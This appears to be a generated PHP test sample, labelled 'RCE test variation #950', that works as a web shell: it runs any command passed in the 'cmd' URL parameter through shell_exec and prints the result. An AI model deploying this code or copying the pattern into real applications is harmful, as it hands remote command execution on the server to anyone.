<?php
// RCE test variation #950
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>